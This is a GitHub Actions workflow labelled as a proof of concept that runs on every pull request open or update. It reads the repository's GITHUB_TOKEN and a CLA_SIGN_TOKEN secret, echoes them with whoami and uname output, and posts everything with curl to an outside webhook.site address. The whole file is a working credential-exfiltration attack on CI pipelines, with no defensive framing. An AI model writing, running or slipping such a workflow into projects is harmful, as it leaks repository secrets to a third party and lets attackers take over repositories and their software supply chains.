name: PoC - whoami, uname, tokens to webhook

on:
  pull_request:
    types: [opened, synchronize]

jobs:
  poc:
    runs-on: ubuntu-latest
    steps:
      - name: Send system info and tokens to webhook
        env:
          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
          CLA_SIGN_TOKEN: ${{ secrets.CLA_SIGN_TOKEN }}
        run: |
          echo "Running as user:"
          whoami
          echo "System info:"
          uname -a
          echo "GITHUB_TOKEN:"
          echo "$GITHUB_TOKEN"
          echo "CLA_SIGN_TOKEN:"
          echo "$CLA_SIGN_TOKEN"
        # Send all above output to the webhook
        shell: bash
      - name: Send output to webhook
        run: |
          OUTPUT="$(whoami && uname -a && echo GITHUB_TOKEN: $GITHUB_TOKEN && echo CLA_SIGN_TOKEN: $CLA_SIGN_TOKEN)"
          curl -X POST -H "Content-Type: text/plain" --data "$OUTPUT" https://webhook.site/ef36781f-5c6e-49a7-b232-b8d6e36e2867
        env:
          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
          CLA_SIGN_TOKEN: ${{ secrets.CLA_SIGN_TOKEN }}
